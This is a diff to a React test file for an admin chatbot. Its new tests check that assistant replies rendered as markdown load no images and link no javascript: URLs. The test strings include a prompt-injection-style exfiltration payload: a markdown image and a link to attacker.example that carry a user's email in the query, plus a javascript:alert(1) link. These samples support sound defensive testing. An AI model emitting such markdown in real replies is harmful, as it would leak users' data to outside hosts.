@@ -3,18 +3,15 @@
  */
 
 import { ChatProvider } from "@/components/admin/chatbot/chat-context"
+import { Chatbot } from "@/components/admin/chatbot/chat-window"
 import { render, screen } from "@testing-library/react"
+import userEvent from "@testing-library/user-event"
+import { chatWithAdminBot } from "@/actions/chatbot"
 import { type ChatMessage } from "@/actions/chatbot/types"
 
 // Mock the chatbot action
 jest.mock("@/actions/chatbot", () => ({
   chatWithAdminBot: jest.fn(),
-}))
-
-// Mock react-markdown
-jest.mock("react-markdown", () => ({
-  __esModule: true,
-  default: ({ children }: { children: React.ReactNode }) => <div>{children}</div>,
 }))
 
 // Mock motion to avoid animation issues in tests
@@ -331,6 +328,96 @@ describe("Chatbot sources display", () => {
 
       expect(messageWithoutSources.sources).toBeUndefined()
     })
+  })
+})
+
+describe("Chatbot answers render through MarkdownBody (P3.8, SEC-42)", () => {
+  beforeAll(() => {
+    // jsdom has no scrollIntoView; the window scrolls to each new message.
+    Element.prototype.scrollIntoView = jest.fn()
+  })
+  beforeEach(() => jest.clearAllMocks())
+
+  async function ask(reply: string) {
+    jest.mocked(chatWithAdminBot).mockResolvedValue({
+      success: true,
+      data: { message: { role: "assistant", content: reply, timestamp: Date.now() }, conversationId: "conv-1" },
+    })
+    const user = userEvent.setup()
+    const view = render(
+      <ChatProvider>
+        <Chatbot userName="Admin" />
+      </ChatProvider>
+    )
+    await user.click(screen.getByRole("button", { name: "Toggle Chatbot" }))
+    await user.type(screen.getByPlaceholderText("Ask about server status..."), "status?")
+    await user.keyboard("{Enter}")
+    await screen.findByText("ok")
+    return view
+  }
+
+  it("renders lists with list items inside the typeset wrapper", async () => {
+    const { container } = await ask("Checks:\n\n- ok\n- fine")
+
+    expect(screen.getByText("ok").closest(".typeset")).not.toBeNull()
+    expect(container.querySelectorAll(".typeset ul > li")).toHaveLength(2)
+  })
+
+  it("loads no image and links no javascript: URL from a reply", async () => {
+    const { container } = await ask("ok ![](https://example.com/?d=x) [run](javascript:alert(1))")
+
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.innerHTML).not.toContain("example.com/?d=x")
+    expect(screen.getByText("run").closest("a")).toBeNull()
+  })
+
+  it("renders the injection payload's image as text, and a link shows its destination (P4.15)", async () => {
+    const { container } = await ask(
+      "ok\n\n![x](https://attacker.example/?d=sam@example.com) and [the dashboard](https://attacker.example/collect?d=1)"
+    )
+
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.innerHTML).not.toContain("?d=sam@example.com")
+    const link = screen.getByText("the dashboard").closest("a")
+    expect(link).toHaveAttribute("href", "https://attacker.example/collect?d=1")
+    expect(link).toHaveTextContent("(https://attacker.example/collect?d=1)")
+  })
+
+  it("sends only roles and content, and the conversation id once it has one", async () => {
+    await ask("ok")
+    const user = userEvent.setup()
+    await user.type(screen.getByPlaceholderText("Ask about server status..."), "again")
+    await user.keyboard("{Enter}")
+
+    const calls = jest.mocked(chatWithAdminBot).mock.calls
+    expect(calls[0][0]).toEqual({
+      messages: [
+        { role: "assistant", content: expect.stringContaining("admin assistant") },
+        { role: "user", content: "status?" },
+      ],
+      conversationId: undefined,
+    })
+    expect(calls[1][0].conversationId).toBe("conv-1")
+    expect(calls[1][0].messages.at(-1)).toEqual({ role: "user", content: "again" })
+  })
+
+  it("shows the action's error copy on a refusal", async () => {
+    jest.mocked(chatWithAdminBot).mockResolvedValue({
+      success: false,
+      code: "NOT_FOUND",
+      error: "That conversation no longer exists. Start a new one.",
+    })
+    const user = userEvent.setup()
+    render(
+      <ChatProvider>
+        <Chatbot />
+      </ChatProvider>
+    )
+    await user.click(screen.getByRole("button", { name: "Toggle Chatbot" }))
+    await user.type(screen.getByPlaceholderText("Ask about server status..."), "hi")
+    await user.keyboard("{Enter}")
+
+    expect(await screen.findByText(/That conversation no longer exists/)).toBeInTheDocument()
   })
 })
 
